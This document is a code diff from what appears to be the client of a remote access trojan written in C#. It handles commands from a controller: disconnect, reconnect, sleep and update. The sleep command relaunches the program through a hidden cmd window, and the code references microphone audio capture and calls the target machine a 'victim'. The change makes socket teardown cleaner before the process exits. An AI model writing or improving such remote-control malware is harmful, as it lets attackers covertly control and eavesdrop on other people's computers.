@@ -349,11 +349,11 @@ namespace winClient48
                             {
                                 if (dsp.Param == 0) //DISCONNECT
                                 {
-                                    fnDisconnect();
+                                    fnDisconnect(v);
                                 }
                                 else if (dsp.Param == 1) //RECONNECT (REFRESH KEY)
                                 {
-                                    fnReconnect();
+                                    fnReconnect(v);
                                 }
                             }
                             else if (dsp.Command == 1) //KEY EXCHANGE
@@ -483,11 +483,11 @@ namespace winClient48
                         {
                             if (para == 0)
                             {
-                                fnDisconnect();
+                                fnDisconnect(victim);
                             }
                             else if (para == 1)
                             {
-                                fnReconnect();
+                                fnReconnect(victim);
                             }
                         }
                         else if (cmd == CMD_TLS && para == PARA_ACK)
@@ -567,11 +567,11 @@ namespace winClient48
                         {
                             if (dsp.Param == 0) //DISCONNECT
                             {
-                                fnDisconnect();
+                                fnDisconnect(victim);
                             }
                             else if (dsp.Param == 1) //RECONNECT (REFRESH KEY)
                             {
-                                fnReconnect();
+                                fnReconnect(victim);
                             }
                         }
                         else if (dsp.Command == 1) //KEY EXCHANGE
@@ -789,14 +789,10 @@ namespace winClient48
                             CreateNoWindow = true,
                         });
 
-                        Environment.Exit(0);
+                        fnDisconnect(v);
                     }
                     else if (cmd[1] == "sl") //Sleep
                     {
-                        /* 1. Kill itself
-                         * 2. Restart
-                         */
-
                         int nSec = int.Parse(cmd[2]);
                         string szExePath = Process.GetCurrentProcess().MainModule.FileName;
                         string szCmd = $"/C ping 127.0.0.1 -n \"{nSec + 1}\" > nul && \"{szExePath}\"";
@@ -810,7 +806,7 @@ namespace winClient48
                             WindowStyle = ProcessWindowStyle.Hidden,
                         });
 
-                        Environment.Exit(0);
+                        fnDisconnect(v);
                     }
                     else if (cmd[1] == "ud") //Update
                     {
@@ -840,7 +836,7 @@ namespace winClient48
 
                             nCode = 1;
 
-                            Environment.Exit(0);
+                            fnDisconnect(v);
                         }
                         catch (Exception ex)
                         {
@@ -2989,20 +2985,39 @@ namespace winClient48
             if (funcMicAudio != null)
                 funcMicAudio = null;
         }
-        void fnDisconnect()
+        void fnDisconnect(clsVictim victim)
         {
             if (is_connected)
             {
-                socket.Close();
+                try
+                {
+                    victim.socket.LingerState = new LingerOption(true, 0); //RST
+                    victim.socket.Close();
+                }
+                catch
+                {
+
+                }
+
                 is_connected = false;
+
                 Environment.Exit(0);
             }
         }
-        void fnReconnect()
+        void fnReconnect(clsVictim victim)
         {
             if (is_connected)
             {
-                socket.Close();
+                try
+                {
+                    victim.socket.LingerState = new LingerOption(true, 0); //RST
+                    victim.socket.Close();
+                }
+                catch
+                {
+
+                }
+
                 is_connected = false;
             }
         }
